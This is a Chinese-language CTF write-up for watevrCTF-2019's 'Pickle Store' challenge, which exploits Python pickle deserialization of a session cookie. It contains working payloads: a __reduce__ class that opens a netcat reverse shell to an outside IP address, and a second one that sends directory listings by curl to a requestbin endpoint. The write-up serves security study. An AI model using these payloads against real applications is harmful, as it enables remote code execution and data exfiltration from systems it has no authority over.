# \[watevrCTF-2019]Pickle Store

## \[watevrCTF-2019]Pickle Store

## 考点

* pickle反序列化

## wp

题目名字也提示了是pickle反序列化

先看看session

```
gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu
```

base64解码得到

```
\x80\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\xf4\x01X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00aa1ba4de55048cf20e0a7a63b7f8eb62q\x05u.
```

python中使用pickle.dumps()函数序列化，使用pickle.loads()函数反序列化，这两个函数是操作字符串的。

不同版本或者不同平台下Python序列化结果不同

`\x80\x03`是Python pickle反序列化的标准开头

```python
import binascii
import pickle

s='gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'
pickle.loads(binascii.a2b_base64(s))
```

反序列化之后可以得到一个字典

```
{'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'}
```

题目提示够买flag需要1000块，感觉修改字典再序列化

![](<../../.gitbook/assets/image (31).png>)

```python
t = {'money': 1000, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'}
binascii.b2a_base64(pickle.dumps(t))
# b'gASVUgAAAAAAAAB9lCiMBW1vbmV5lE3oA4wHaGlzdG9yeZRdlIwQYW50aV90YW1wZXJfaG1hY5SMIGFhMWJhNGRlNTUwNDhjZjIwZTBhN2E2M2I3ZjhlYjYylHUu\n'
```

尝试失败，再看字典的元素，`anti_tamper_hmac`这个元素在够买后发生了改变，应该是后端对key和value做了某种hash加密，由于不知道加密方式，所以不能修改`money`。

尝试反序列化RCE

```python
import binascii
import pickle

shell = '''__import__('os').system('nc 81.68.218.54 30000 -e/bin/sh')'''

class Evil(object):
    def __reduce__(self):
        return (eval, (shell,))
s = Evil()
print(binascii.b2a_base64(pickle.dumps(s)))
```

得到`gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDgxLjY4LjIxOC41NCAzMDAwMCAtZS9iaW4vc2gnKZSFlFKULg==`

修改session刷新页面即可反弹shell

![](<../../.gitbook/assets/image (19).png>)

或者使用[`RequestBin`](http://requestbin.cn)接收数据

```python
import binascii
import pickle

shell = '''__import__('os').system("echo `ls` > /tmp/1.txt;curl -v -X POST 'http://requestbin.cn:80/t9dmemt9' -d @/tmp/1.txt")'''

class Evil(object):
    def __reduce__(self):
        return (eval, (shell,))
s = Evil()
print(binascii.b2a_base64(pickle.dumps(s)))
```

![](<../../.gitbook/assets/image (18).png>)
